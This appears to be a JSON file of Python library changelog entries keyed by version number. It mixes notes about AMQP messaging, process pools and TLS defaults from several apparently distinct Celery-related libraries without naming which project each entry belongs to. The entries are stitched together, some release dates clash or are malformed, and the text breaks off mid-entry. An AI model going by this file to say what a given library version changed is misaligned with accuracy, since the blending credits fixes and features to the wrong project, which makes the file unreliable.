{"4.2.0": "=====\n:release-date: 2018-05-21 09:00 A.M IST\n:release-by: Omer Katz\n\n- Now passing ``max_retries``, ``interval_start``, ``interval_step``,\n  ``interval_max`` parameters from broker ``transport_options`` to\n  :meth:`~kombu.Connection.ensure_connection` when returning\n  :meth:`~kombu.Connection.default_connection` (Issue 765).\n\n    Contributed by **Anthony Lukach**.\n\n- Qpid: messages are now durable by default\n\n    Contributed by **David Davis**\n\n- Kombu now requires version 2.10.4 or greater of the redis library,\n  in line with Celery\n\n    Contributed by **Colin Jeanne**\n\n- Fixed ImportError in some environments with outdated simplejson\n\n    Contributed by **Aaron Morris**\n\n- MongoDB: fixed failure on MongoDB versions with an \"-rc\" tag\n\n    Contributed by **dust8**\n\n- Ensure periodic polling frequency does not exceed timeout in\n  virtual transport\n\n    Contributed by **Arcadiy Ivanov**\n\n- Fixed string handling when using python-future module\n\n    Contributed by **John Koehl**\n\n- Replaced \"async\" with \"asynchronous\" in preparation for Python 3.7\n\n    Contributed by **Thomas Achtemichuk**\n\n- Allow removing pool size limit when in use\n\n    Contributed by **Alex Hill**\n\n- Codebase improvements and fixes by:\n\n    - **j2gg0s**\n    - **Jon Dufresne**\n    - **Jonas Lergell**\n    - **Mads Jensen**\n    - **Nicolas Delaby**\n    - **Omer Katz**\n\n- Documentation improvements by:\n\n    - **Felix Yan**\n    - **Harry Moreno**\n    - **Mads Jensen**\n    - **Omer Katz**\n    - **Radha Krishna. S.**\n    - **Wojciech Maty\u015bkiewicz**\n\n.. _version-4.1.0:\n\n", "4.1.0": "=====\n:release-date: 2017-07-17 04:45 P.M MST\n:release-by: Anthony Lukach\n\n- SQS: Added support for long-polling on all supported queries. Fixed bug\n  causing error on parsing responses with no retrieved messages from SQS.\n\n    Contributed by **Anthony Lukach**.\n\n- Async hub: Fixed potential infinite loop while performing todo tasks\n  (Issue celery/celery3712).\n\n- Qpid: Fixed bug where messages could have duplicate ``delivery_tag``\n  (Issue 563).\n\n    Contributed by **bmbouter**.\n\n- MongoDB: Fixed problem with using ``readPreference`` option at pymongo 3.x.\n\n    Contributed by **Mikhail Elovskikh**.\n\n- Re-added support for :pypi:``SQLAlchemy``\n\n    Contributed by **Amin Ghadersohi**.\n\n- SQS: Fixed bug where hostname would default to ``localhost`` if not specified\n  in settings.\n\n    Contributed by **Anthony Lukach**.\n\n- Redis: Added support for reading password from transport URL (Issue 677).\n\n    Contributed by **George Psarakis**.\n\n- RabbitMQ: Ensured safer encoding of queue arguments.\n\n    Contributed by **Robert Kopaczewski**.\n\n- Added fallback to :func:``uuid.uuid5`` in :func:``generate_oid`` if\n  :func:``uuid.uuid3`` fails.\n\n    Contributed by **Bill Nottingham**.\n\n- Fixed race condition and innacurrate timeouts for\n  :class:``kombu.simple.SimpleBase`` (Issue 720).\n\n    Contributed by **c-nichols**.\n\n- Zookeeper: Fixed last chroot character trimming\n\n    Contributed by **Dima Kurguzov**.\n\n- RabbitMQ: Fixed bug causing an exception when attempting to close an\n  already-closed connection (Issue 690).\n\n    Contributed by **eavictor**.\n\n- Removed deprecated use of StopIteration in generators and invalid regex\n  escape sequence.\n\n    Contributed by **Jon Dufresne**.\n\n- Added Python 3.6 to CI testing.\n\n    Contributed by **Jon Dufresne**.\n\n- SQS: Allowed endpoint URL to be specified in the boto3 connection.\n\n    Contributed by **georgepsarakis**.\n\n- SQS: Added support for Python 3.4.\n\n    Contributed by **Anthony Lukach**.\n\n- SQS: ``kombu[sqs]`` now depends on :pypi:`boto3` (no longer using\n  :pypi:`boto)`.\n\n    - Adds support for Python 3.4+\n    - Adds support for FIFO queues (Issue 678) and (Issue celery/celery3690)\n    - Avoids issues around a broken endpoints file (Issue celery/celery3672)\n\n    Contributed by **Mischa Spiegelmock** and **Jerry Seutter**.\n\n- Zookeeper: Added support for delaying task with Python 3.\n\n    Contributed by **Dima Kurguzov**.\n\n- SQS: Fixed bug where :meth:`kombu.transport.SQS.drain_events` did not support\n  callback argument (Issue 694).\n\n    Contributed by **Michael Montgomery**.\n\n- Fixed bug around modifying dictionary size while iterating over it\n  (Issue 675).\n\n    Contributed by **Felix Yan**.\n\n- etcd: Added handling for :exc:`EtcdException` exception rather than\n  :exc:`EtcdError`.\n\n    Contributed by **Stephen Milner**.\n\n- Documentation improvements by:\n\n    - **Mads Jensen**\n    - **Matias Insaurralde**\n    - **Omer Katz**\n    - **Dmitry Dygalo**\n    - **Christopher Hoskin**\n\n.. _version-4.0.2:\n\n", "4.0.2": "=====\n:release-date: 2016-12-15 03:31 P.M PST\n:release-by: Ask Solem\n\n- Now depends on :mod:`amqp` 2.1.4\n\n    This new version takes advantage of TCP Keepalive settings on Linux,\n    making it better at detecting closed connections, also in failover\n    conditions.\n\n- Redis: Priority was reversed so, e.g. priority 0 became priority 9.\n\n.. _version-4.0.1:\n\n", "4.0.1": "=====\n:release-date: 2016-12-07 06:00 P.M PST\n:release-by: Ask Solem\n\n- Now depends on :mod:`amqp` 2.1.3\n\n    This new version takes advantage of the new ``TCP_USER_TIMEOUT`` socket option\n    on Linux.\n\n- Producer: Fixed performance degradation when default exchange specified\n  (Issue 651).\n\n- QPid: Switch to using getattr in qpid.Transport.__del__ (Issue 658)\n\n    Contributed by **Patrick Creech**.\n\n- QPid: Now uses monotonic time for timeouts.\n\n- MongoDB: Fixed compatibility with Python 3 (Issue 661).\n\n- Consumer: ``__exit__`` now skips cancelling consumer if connection-related\n  error raised (Issue 670).\n\n- MongoDB: Removes use of natural sort (Issue 638).\n\n    Contributed by **Anton Chaporgin**.\n\n- Fixed wrong keyword argument ``channel`` error (Issue 652).\n\n    Contributed by **Toomore Chiang**.\n\n- Safe argument to ``urllib.quote`` must be bytes on Python 2.x (Issue 645).\n\n- Documentation improvements by:\n\n    - **Carlos Edo**\n    - **Cemre Mengu**\n\n.. _version-4.0:\n\n", "4.0.0": "--------------------\n- Support Sphinx 4.x.\n- Remove dependency to case.\n- Drop support of Python < 3.7.\n- Update to psutil 5.9.0.\n- Add python_requires to enforce Python version.\n- Replace deprecated threading Event.isSet with Event.is_set.\n- Prevent segmentation fault in get_pdeathsig while using ctypes (361).\n- Migrated CI to Github actions.\n- Python 3.10 support added.\n\n\n", "3.6.4.0": "--------------------\n- Issue 309: Add Python 3.9 support to spawnv_passfds()\n- fix 314 \n\n", "3.6.1": "--------------------\n\n- Logging max memory reached at INFO rather than WARNING (255)\n\n-  Pass arguments when wrapping sys.exit (275) \n\n-  Remove win32/py2k special (276) \n\n- Ensure READY messages sent out by exiting worker are consumed prior to it actually existing.\n\n- Pass max_memory_per_child to child worker process (251)\n\n- Fix compatibility with Python 2.7 on Windows (283) \n\n", "3.6.0.0": "--------------------\n\n- Add support of sending parent process death signal.\n\n- Previous fix for handling timeouts caused a problem in warm shutdowns due\n  to use of deepcopy.\n\n  We now use a shallow copy of the cache and do so only when it is needed.\n\n- Cleanup old checks and workarounds for Python versions we no longer support.\n\n", "3.5.0.5": "--------------------\n\n- Fix a crash when handling a timeout.\n- Improve billiard.einfo.Frame compatibility with Python to avoid crashes when using Django.\n- Cleanups.\n\n", "3.5.0.4": "--------------------\n\n- Fix rebuild_ctype losing BufferedWrapper reference on Python 3.\n- Deprecation warning with python 3.6 fixed.\n- Correct spawn start method.\n\n", "3.5.0.3": "--------------------\n\n- Adds Process._authkey alias to .authkey for 2.7 compat.\n- Remove superfluous else clause from max_memory_per_child_check.\n- Document and test all supported Python versions.\n- Extend 'Process' to be compatible with < Py3.5.\n- Use a properly initialized logger in pool.py error logging.\n- _trywaitkill can now kill a whole process group if the worker process declares itself as a group leader.\n- Fix cpython issue 14881 (See https://bugs.python.org/issue14881).\n- Fix for a crash on windows.\n- Fix messaging in case of worker exceeds max memory.\n\n", "3.5.0.2": "--------------------\n\n- max_memory_per_child was measured in kilobytes on Linux, but bytes on\n  *BSD/MacOS, it's now always kilobytes.\n\n- Windows: Adds support for max_memory_per_child, but requires the\n  ``psutil`` package to be installed.\n\n- Fixed bug in ForkingPickler.loadbuf, where it tried to pass\n  a BytesIO instance directly to ``pickle.loads`` on Python 2.7.\n\n", "3.5.0.1": "--------------------\n\n- Connection: Properly handle EINTR (Issue 191).\n\n- Fixed bug with missing CreateProcess for Windows on Python 2.7.\n\n- Adds Process._counter for compatibility with Python <3.5.\n\n", "3.5.0.0": "--------------------\n\n- No longer supports Python 2.6\n\n    You need Python 2.7 or later to use this version of billiard.\n\n- Merged changes from CPython 3.5\n\n", "3.3.0.20": "---------------------\n\n- Pool: Timeouts will attempt to send SIGKILL, but this signal\n  does not exist on Windows.  Replaced with SIGTERM.\n\n", "3.3.0.19": "---------------------\n\n- Pool: Exceptions in user timeout callbacks are now logged instead\n  of crashing the pool.\n\n    Contributed by Pierre Fersing.\n\n- Pool: Exit codes in errors were improperly being represented as signals.\n\n- Pool: ``.map``. and ``.imap`` now working again.\n\n- Now builds on FreeBSD 10.\n\n    Contributed by Michael Fladischer.\n\n", "3.3.0.18": "---------------------\n\n- Now compiles on GNU/kFreeBSD\n\n    Contributed by Michael Fladischer.\n\n- Pool: `AF_PIPE` address fixed so that it works on recent Windows versions\n  in combination with Python 2.7.7.\n\n    Fix contributed by Joshua Tacoma.\n\n- Pool: Fix for `Supervisor object has no attribute _children` error.\n\n    Fix contributed by Andres Riancho.\n\n- Pool: Fixed bug with human_status(None).\n\n- Pool: shrink did not work properly if asked to remove more than 1 process.\n\n\n", "3.3.0.17": "---------------------\n\n- Fixes SemLock on Python 3.4 (Issue 107) when using\n  ``forking_enable(False)``.\n\n- Pool: Include more useful exitcode information when processes exit.\n\n", "3.3.0.16": "---------------------\n\n- Previous release was missing the billiard.py3 package from MANIFEST\n  so the installation would not work on Python 3.\n\n", "3.3.0.15": "---------------------\n\n- Pool: Fixed \"cannot join process not started\" error.\n\n- Now uses billiard.py2 and billiard.py3 specific packages that are installed\n  depending on the python version used.\n\n    This way the installation will not import version specific modules (and\n    possibly crash).\n\n", "3.3.0.14": "---------------------\n\n- Fixed problem with our backwards compatible ``bytes`` wrapper\n  (Issue 103).\n\n- No longer expects frozen applications to have a valid ``__file__``\n  attribute.\n\n    Fix contributed by George Sibble.\n\n", "3.3.0.13": "---------------------\n\n- Fixes compatibility with Python < 2.7.6\n\n- No longer attempts to handle ``SIGBUS``\n\n    Contributed by Vishal Vatsa.\n\n- Non-thread based pool now only handles signals:\n\n    ``SIGHUP``, ``SIGQUIT``, ``SIGTERM``, ``SIGUSR1``,\n    ``SIGUSR2``.\n\n- setup.py: Only show compilation warning for build related commands.\n\n", "3.3.0.12": "---------------------\n\n- Fixed installation for Python 3.\n\n    Contributed by Rickert Mulder.\n\n- Pool: Fixed bug with maxtasksperchild.\n\n    Fix contributed by Ionel Cristian Maries.\n\n- Pool: Fixed bug in maintain_pool.\n\n", "3.3.0.11": "---------------------\n\n- Fixed Unicode error when installing the distribution (Issue 89).\n\n- Daemonic processes are now allowed to have children.\n\n    But note that it will not be possible to automatically\n    terminate them when the process exits.\n\n    See discussion at https://github.com/celery/celery/issues/1709\n\n- Pool:  Would not always be able to detect that a process exited.\n\n\n", "3.3.0.10": "---------------------\n\n- Windows: Fixed problem with missing ``WAITABANDONED_0``\n\n    Fix contributed by Matthias Wagner\n\n- Windows: PipeConnection can now be inherited.\n\n    Fix contributed by Matthias Wagner\n\n", "3.3.0.9": "--------------------\n\n- Temporary workaround for Celery maxtasksperchild issue.\n\n    Fix contributed by Ionel Cristian Maries.\n\n", "3.3.0.8": "--------------------\n\n- Now also sets ``multiprocessing.current_process`` for compatibility\n  with loggings ``processName`` field.\n\n", "3.3.0.7": "--------------------\n\n- Fixed compatibility with PyPy 2.1 + 2.2.\n\n- Fixed problem in pypy detection.\n\n    Fix contributed by Tin Tvrtkovic.\n\n- Now uses ``ctypes.find_library`` instead of hardcoded path to find\n  the macOS CoreServices framework.\n\n    Fix contributed by Moritz Kassner.\n\n\n", "3.3.0.6": "--------------------\n\n- Now works without C extension again.\n\n- New ``_billiard.read(fd, buffer, [len, ])`` function\n  implements os.read with buffer support (new buffer API)\n\n- New pure-python implementation of ``Connection.send_offset``.\n\n", "3.3.0.5": "--------------------\n\n- All platforms except for Windows/PyPy/Jython now requires the C extension.\n\n", "3.3.0.4": "--------------------\n\n- Fixed problem with Python3 and setblocking.\n\n", "3.3.0.3": "--------------------\n\n- Now works on Windows again.\n\n", "3.3.0.2": "--------------------\n\n- ApplyResult.terminate() may be set to signify that the job\n  must not be executed.  It can be used in combination with\n  Pool.terminate_job.\n\n- Pipe/_SimpleQueue: Now supports rnonblock/wnonblock arguments\n  to set the read or write end of the pipe to be nonblocking.\n\n- Pool: Log message included exception info but exception happened\n  in another process so the resulting traceback was wrong.\n\n- Pool: Worker process can now prepare results before they are sent\n  back to the main process (using ``Worker.prepare_result``).\n\n", "3.3.0.1": "--------------------\n\n- Pool: New ``correlation_id`` argument to ``apply_async`` can be\n  used to set a related id for the ``ApplyResult`` object returned:\n\n    >>> r = pool.apply_async(target, args, kwargs, correlation_id='foo')\n    >>> r.correlation_id\n    'foo'\n\n- Pool: New callback `on_process_exit` is called when a pool\n  process exits, with signature ``(pid, exitcode)``.\n\n    Contributed by Daniel M. Taub.\n\n- Pool: Improved the too many restarts detection.\n\n", "3.3.0.0": "--------------------\n\n- Dual code base now runs on Python 2.6+ and Python 3.\n\n- No longer compatible with Python 2.5\n\n- Includes many changes from multiprocessing in 3.4.\n\n- Now uses ``time.monotonic`` when available, also including\n  fallback implementations for Linux and macOS.\n\n- No longer cleans up after receiving SIGILL, SIGSEGV or SIGFPE\n\n    Contributed by Kevin Blackham\n\n- ``Finalize`` and ``register_after_fork`` is now aliases to multiprocessing.\n\n    It's better to import these from multiprocessing directly now\n    so that there aren't multiple registries.\n\n- New `billiard.queues._SimpleQueue` that does not use semaphores.\n\n- Pool: Can now be extended to support using multiple IPC queues.\n\n- Pool: Can now use async I/O to write to pool IPC queues.\n\n- Pool: New ``Worker.on_loop_stop`` handler can be used to add actions\n  at pool worker process shutdown.\n\n    Note that, like all finalization handlers, there is no guarantee that\n    this will be executed.\n\n    Contributed by dmtaub.\n\n", "2.7.3.30": "---------------------\n\n- Fixed ImportError in billiard._ext\n\n", "2.7.3.29": "---------------------\n\n- Compilation: Fixed improper handling of HAVE_SEM_OPEN (Issue 55)\n\n    Fix contributed by Krzysztof Jagiello.\n\n- Process now releases logging locks after fork.\n\n    This previously happened in Pool, but it was done too late\n    as processes logs when they bootstrap.\n\n- Pool.terminate_job now ignores `No such process` errors.\n\n- billiard.Pool entrypoint did not support new arguments\n  to billiard.pool.Pool\n\n- Connection inbound buffer size increased from 1kb to 128kb.\n\n- C extension cleaned up by properly adding a namespace to symbols.\n\n- _exit_function now works even if thread wakes up after gc collect.\n\n", "2.7.3.28": "---------------------\n\n- Pool: Fixed regression that disabled the deadlock\n  fix in 2.7.3.24\n\n- Pool: RestartFreqExceeded could be raised prematurely.\n\n- Process: Include pid in startup and process INFO logs.\n\n", "2.7.3.27": "---------------------\n\n- Manager now works again.\n\n- Python 3 fixes for billiard.connection.\n\n- Fixed invalid argument bug when running on Python 3.3\n\n    Fix contributed by Nathan Wan.\n\n- Ignore OSError when setting up signal handlers.\n\n", "2.7.3.26": "---------------------\n\n- Pool: Child processes must ignore SIGINT.\n\n", "2.7.3.25": "---------------------\n\n- Pool: 2.7.3.24 broke support for subprocesses (Issue 48).\n\n    Signals that should be ignored were instead handled\n    by terminating.\n\n", "2.7.3.24": "---------------------\n\n- Pool:  Make sure finally blocks are called when process exits\n  due to a signal.\n\n    This fixes a deadlock problem when the process is killed\n    while having acquired the shared semaphore.  However, this solution\n    does not protect against the processes being killed, a more elaborate\n    solution is required for that. Hopefully this will be fixed soon in a\n    later version.\n\n- Pool:  Can now use GDB to debug pool child processes.\n\n- Fixes Python 3 compatibility problems.\n\n    Contributed by Albertas Agejevas.\n\n", "2.7.3.23": "---------------------\n\n- Windows: Now catches SystemExit from setuptools while trying to build\n  the C extension (Issue 41).\n\n", "2.7.3.22": "---------------------\n\n- Pool: apply_async now supports a ``callbacks_propagate`` keyword\n  argument that can be a tuple of exceptions to propagate in callbacks.\n  (callback, errback, accept_callback, timeout_callback).\n\n- Errors are no longer logged for OK and recycle exit codes.\n\n    This would cause normal maxtasksperchild recycled process\n    to log an error.\n\n- Fixed Python 2.5 compatibility problem (Issue 33).\n\n- FreeBSD: Compilation now disables semaphores if Python was built\n  without it (Issue 40).\n\n    Contributed by William Grzybowski\n\n", "2.7.3.21": "---------------------\n\n- Fixed typo EX_REUSE -> EX_RECYCLE\n\n- Code now conforms to new pep8.py rules.\n\n", "2.7.3.20": "---------------------\n\n- Pool: Disable restart limit if maxR is not set.\n\n- Pool: Now uses os.kill instead of signal.signal.\n\n    Contributed by Lukasz Langa\n\n- Fixed name error in process.py\n\n- Pool: ApplyResult.get now properly raises exceptions.\n\n    Fix contributed by xentac.\n\n", "2.7.3.19": "---------------------\n\n- Fixes problem at shutdown when gc has collected symbols.\n\n- Pool now always uses _kill for Py2.5 compatibility on Windows (Issue 32).\n\n- Fixes Python 3 compatibility issues\n\n", "2.7.3.18": "---------------------\n\n- [Pool] Fix for check_timeouts if not set.\n\n    Fix contributed by Dmitry Sukhov\n\n- Fixed pickle problem with Traceback.\n\n    Code.frame.__loader__ is now ignored as it may be set to\n    an unpickleable object.\n\n- The Django old-layout warning was always showing.\n\n", "2.7.3.17": "---------------------\n\n- Fixes typo\n\n", "2.7.3.16": "---------------------\n\n- Windows: Fixes for SemLock._rebuild (Issue 24).\n\n- Pool: Job terminated with terminate_job now raises\n  billiard.exceptions.Terminated.\n\n", "2.7.3.15": "---------------------\n\n- Windows: Fixes unpickling of SemLock when using fallback.\n\n- Windows: Fixes installation when no C compiler.\n\n", "2.7.3.14": "---------------------\n\n- Installation now works again for Python 3.\n\n", "2.7.3.13": "---------------------\n\n- Merged with Python trunk (many authors, many fixes: see Python changelog in\n  trunk).\n\n- Using execv now also works with older Django projects using setup_environ\n  (Issue 10).\n\n- Billiard now installs with a warning that the C extension could not be built\n  if a compiler is not installed or the build fails in some other way.\n\n    It really is recommended to have the C extension installed when running\n    with force execv, but this change also makes it easier to install.\n\n- Pool: Hard timeouts now sends KILL shortly after TERM so that C extensions\n  cannot block the signal.\n\n    Python signal handlers are called in the interpreter, so they cannot\n    be called while a C extension is blocking the interpreter from running.\n\n- Now uses a timeout value for Thread.join that doesn't exceed the maximum\n  on some platforms.\n\n- Fixed bug in the SemLock fallback used when C extensions not installed.\n\n    Fix contributed by Mher Movsisyan.\n\n- Pool: Now sets a Process.index attribute for every process in the pool.\n\n    This number will always be between 0 and concurrency-1, and\n    can be used to e.g. create a logfile for each process in the pool\n    without creating a new logfile whenever a process is replaced.\n\n", "2.7.3.12": "---------------------\n\n- Fixed Python 2.5 compatibility issue.\n\n- New Pool.terminate_job(pid) to terminate a job without raising WorkerLostError\n\n", "2.7.3.11": "---------------------\n\n- Adds support for FreeBSD 7+\n\n    Fix contributed by koobs.\n\n- Pool: New argument ``allow_restart`` is now required to enable\n  the pool process sentinel that is required to restart the pool.\n\n    It's disabled by default, which reduces the number of file\n    descriptors/semaphores required to run the pool.\n\n- Pool: Now emits a warning if a worker process exited with error-code.\n\n    But not if the error code is 155, which is now returned if the worker\n    process was recycled (maxtasksperchild).\n\n- Python 3 compatibility fixes.\n\n- Python 2.5 compatibility fixes.\n\n", "2.7.3.10": "---------------------\n\n- The ``TimeLimitExceeded`` exception string representation\n  only included the seconds as a number, it now gives a more human\n  friendly description.\n\n- Fixed typo in ``LaxBoundedSemaphore.shrink``.\n\n- Pool: ``ResultHandler.handle_event`` no longer requires\n  any arguments.\n\n- setup.py bdist now works\n\n", "2.7.3.9": "--------------------\n\n- Environment variable ``MP_MAIN_FILE`` envvar is now set to\n  the path of the ``__main__`` module when execv is enabled.\n\n- Pool: Errors occurring in the TaskHandler are now reported.\n\n", "2.7.3.8": "--------------------\n\n- Can now be installed on Py 3.2\n\n- Issue 12091: simplify ApplyResult and MapResult with threading.Event\n\n  Patch by Charles-Francois Natali\n\n- Pool: Support running without TimeoutHandler thread.\n\n    - The with_*_thread arguments has also been replaced with\n      a single `threads=True` argument.\n\n    - Two new pool callbacks:\n\n        - ``on_timeout_set(job, soft, hard)``\n\n            Applied when a task is executed with a timeout.\n\n        - ``on_timeout_cancel(job)``\n\n            Applied when a timeout is cancelled (the job completed)\n\n", "2.7.3.7": "--------------------\n\n- Fixes Python 2.5 support.\n\n", "2.7.3.6": "--------------------\n\n- Pool: Can now be used in an event loop, without starting the supporting\n  threads (TimeoutHandler still not supported)\n\n    To facilitate this the pool has gained the following keyword arguments:\n\n        - ``with_task_thread``\n        - ``with_result_thread``\n        - ``with_supervisor_thread``\n        - ``on_process_up``\n\n            Callback called with Process instance as argument\n            whenever a new worker process is added.\n\n            Used to add new process fds to the eventloop::\n\n                def on_process_up(proc):\n                    hub.add_reader(proc.sentinel, pool.maintain_pool)\n\n        - ``on_process_down``\n\n            Callback called with Process instance as argument\n            whenever a new worker process is found dead.\n\n            Used to remove process fds from the eventloop::\n\n                def on_process_down(proc):\n                    hub.remove(proc.sentinel)\n\n        - ``semaphore``\n\n            Sets the semaphore used to protect from adding new items to the\n            pool when no processes available.  The default is a threaded\n            one, so this can be used to change to an async semaphore.\n\n    And the following attributes::\n\n        - ``readers``\n\n            A map of ``fd`` -> ``callback``, to be registered in an eventloop.\n            Currently this is only the result outqueue with a callback\n            that processes all currently incoming results.\n\n    And the following methods::\n\n        - ``did_start_ok``\n\n            To be called after starting the pool, and after setting up the\n            eventloop with the pool fds, to ensure that the worker processes\n            didn't immediately exit caused by an error (internal/memory).\n\n        - ``maintain_pool``\n\n            Public version of ``_maintain_pool`` that handles max restarts.\n\n- Pool: Process too frequent restart protection now only counts if the process\n  had a non-successful exit-code.\n\n    This to take into account the maxtasksperchild option, and allowing\n    processes to exit cleanly on their own.\n\n- Pool: New options max_restart + max_restart_freq\n\n    This means that the supervisor can't restart processes\n    faster than max_restart' times per max_restart_freq seconds\n    (like the Erlang supervisor maxR & maxT settings).\n\n    The pool is closed and joined if the max restart\n    frequency is exceeded, where previously it would keep restarting\n    at an unlimited rate, possibly crashing the system.\n\n    The current default value is to stop if it exceeds\n    100 * process_count restarts in 1 seconds.  This may change later.\n\n    It will only count processes with an unsuccessful exit code,\n    this is to take into account the ``maxtasksperchild`` setting\n    and code that voluntarily exits.\n\n- Pool: The ``WorkerLostError`` message now includes the exit-code of the\n  process that disappeared.\n\n\n", "2.7.3.5": "--------------------\n\n- Now always cleans up after ``sys.exc_info()`` to avoid\n  cyclic references.\n\n- ExceptionInfo without arguments now defaults to ``sys.exc_info``.\n\n- Forking can now be disabled using the\n  ``MULTIPROCESSING_FORKING_DISABLE`` environment variable.\n\n    Also this envvar is set so that the behavior is inherited\n    after execv.\n\n- The semaphore cleanup process started when execv is used\n  now sets a useful process name if the ``setproctitle``\n  module is installed.\n\n- Sets the ``FORKED_BY_MULTIPROCESSING``\n  environment variable if forking is disabled.\n\n\n", "2.7.3.4": "--------------------\n\n- Added `billiard.ensure_multiprocessing()`\n\n    Raises NotImplementedError if the platform does not support\n    multiprocessing (e.g. Jython).\n\n\n", "2.7.3.3": "--------------------\n\n- PyPy now falls back to using its internal _multiprocessing module,\n  so everything works except for forking_enable(False) (which\n  silently degrades).\n\n- Fixed Python 2.5 compat. issues.\n\n- Uses more with statements\n\n- Merged some of the changes from the Python 3 branch.\n\n", "2.7.3.2": "--------------------\n\n- Now installs on PyPy/Jython (but does not work).\n\n", "2.7.3.1": "--------------------\n\n- Python 2.5 support added.\n\n", "2.7.3.0": "--------------------\n\n- Updated from Python 2.7.3\n\n- Python 2.4 support removed, now only supports 2.5, 2.6 and 2.7.\n  (may consider py3k support at some point).\n\n- Pool improvements from Celery.\n\n- no-execv patch added (https://bugs.python.org/issue8713)\n\n\nChanges\n=======\n\npy-amqp is fork of amqplib used by Kombu containing additional features and improvements.\nThe previous amqplib changelog is here:\nhttp://code.google.com/p/py-amqplib/source/browse/CHANGES\n\n\n.. _version-5.2.0:\n\n", "5.2.0": "=====\n\n:release-date: 2021-11-08 7.15 A.M UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Prevent from subscribing to empty channels (7040)\n- fix register_task method.\n- Fire task failure signal on final reject (6980)\n- Limit pymongo version: <3.12.1 (7041)\n- Bump min kombu version to 5.2.1\n\n.. _version-5.2.0rc2:\n\n", "5.1.1": "=====\n:release-date: 2022-04-17 12:45 P.M. UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Use AF_UNSPEC for name resolution (389).\n\n\n.. _version-5.1.0:\n\n", "5.1.0": "=====\n:release-date: 2023-11-05 2:45 P.M UTC+6:00\n:release-by: ASIF SAIF UDDIN\n\n- Dropped Python 3.6 support.\n- Added new Python versions support.\n- Dropped old dependencies.\n- Added new GHA based CI.\n- Added slots support and impproved dynamic assignment.\n\n\n  Contributed by **Asif Saif Uddin**\n\n\n.. _version-5.0.0:\n\n", "5.0.9": "=====\n:release-date: 2021-12-20 11:00 A.M. UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Append to _used_channel_ids in _used_channel_ids\n\n\n.. _version-5.0.8:\n\n", "5.0.8": "=====\n:release-date: 2021-12-19 11:15 A.M. UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Reduce memory usage of Connection (377)\n- Add additional error handling around code where an OSError\n  may be raised on failed connections. Fixes (378)\n\n\n.. _version-5.0.7:\n\n", "5.0.7": "=====\n:release-date: 2021-12-13 15:45 P.M. UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Remove dependency to case\n- Bugfix: not closing socket after server disconnect\n\n\n.. _version-5.0.6:\n\n", "5.0.6": "=====\n:release-date: 2021-04-01 10:45 A.M. UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Change the order in which context.check_hostname and context.verify_mode get set\n  in SSLTransport._wrap_socket_sni. Fixes bug introduced in 5.0.3 where setting\n  context.verify_mode = ssl.CERT_NONE would raise\n  \"ValueError: Cannot set verify_mode to CERT_NONE when check_hostname is enabled.\"\n  Setting context.check_hostname prior to setting context.verify_mode resolves the\n  issue.\n- Remove TCP_USER_TIMEOUT option for Solaris (355)\n- Pass long_description to setup() (353)\n- Fix for tox-docker 2.0\n- Moved to GitHub actions CI (359)\n\n.. _version-5.0.5:\n\n", "5.0.5": "=====\n:release-date: 2021-01-28 4:30 P.M UTC+6:00\n:release-by: Asif Saif Uddin\n\n-  Removed mistakenly introduced code which was causing import errors\n\n\n\n.. _version-5.0.4:\n\n", "5.0.4": "=====\n:release-date: 2021-01-28 2:30 P.M UTC+6:00\n:release-by: Asif Saif Uddin\n\n-  Add missing load_default_certs() call to fix a regression in v5.0.3 release. (350)\n\n\n.. _version-5.0.3:\n\n", "5.0.3": "=====\n:release-date: 2021-01-19 9:00 P.M UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Change the default value of ssl_version to None. When not set, the\n  proper value between ssl.PROTOCOL_TLS_CLIENT and ssl.PROTOCOL_TLS_SERVER\n  will be selected based on the param server_side in order to create\n  a TLS Context object with better defaults that fit the desired\n  connection side.\n\n- Change the default value of cert_reqs to None. The default value\n  of ctx.verify_mode is ssl.CERT_NONE, but when ssl.PROTOCOL_TLS_CLIENT\n  is used, ctx.verify_mode defaults to ssl.CERT_REQUIRED.\n\n- Fix context.check_hostname logic. Checking the hostname depends on\n  having support of the SNI TLS extension and being provided with a\n  server_hostname value. Another important thing to mention is that\n  enabling hostname checking automatically sets verify_mode from\n  ssl.CERT_NONE to ssl.CERT_REQUIRED in the stdlib ssl and it cannot\n  be set back to ssl.CERT_NONE as long as hostname checking is enabled.\n\n- Refactor the SNI tests to test one thing at a time and removing some\n  tests that were being repeated over and over.\n\n\n\n.. _version-5.0.2:\n\n", "5.0.2": "=====\n:release-date: 2020-09-06 6:30 P.M UTC+3:00\n:release-by: Omer Katz\n\n- Bump required amqp version to 5.0.0.\n\n.. _version-5.0.1:\n\n", "5.0.1": "=====\n:release-date: 2020-08-23 19:10 P.M UTC+3:00\n:release-by: Omer Katz\n\n- Removed kombu.five from the reference documentation since it no longer exists\n- Adjusted the stable documentation's version in Sphinx's configuration since that was overlooked in the latest release\n\n.. _version-5.0.0:\n\n", "5.0.0": "=====\n:release-date: 2020-09-06 6:10 P.M UTC+3:00\n:release-by: Omer Katz\n\n- Dropped Python 3.5 support.\n\n  Contributed by **Omer Katz**\n\n.. _version-5.0.0a1:\n\n", "5.0.0b1": "=======\n:release-date: 2020-09-01 6:20 P.M UTC+3:00\n:release-by: Omer Katz\n\n- Dropped Python 3.5 support.\n\n  Contributed by **Omer Katz**\n\n- Removed additional compatibility code.\n\n  Contributed by **Omer Katz**\n\n.. _version-5.0.0a1:\n\n", "5.0.0a1": "=======\n:release-date: 2019-04-01 4:30 P.M UTC+3:00\n:release-by: Omer Katz\n\n- Dropped Python 2.x support.\n\n  Contributed by **Omer Katz**\n\n- Dropped Python 3.4 support.\n\n  Contributed by **Omer Katz**\n\n- Removed the :mod:`vine.five` module.\n\n  Contributed by **Omer Katz**\n\n- Removed the :mod:`vine.backports.weakref_backports` module.\n\n  Contributed by **Omer Katz**\n\n.. _version-1.3.0:\n\n", "2.6.1": "=====\n:release-date: 2020-07-31 10.30 P.M UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Fix buffer overflow in frame_writer after frame_max is increased. `frame_writer`\nallocates a `bytearray` on initialization with a length based on the `connection.frame_max`\nvalue. If `connection.frame_max` is changed to a larger value, this causes an\nerror like `pack_into requires a buffer of at least 408736 bytes`.\n\n\n.. _version-2.6.0:\n\n", "2.6.0": "=====\n:release-date: 20-06-01 12.00 P.M UTC+6:00\n:release-by: Asif Saif 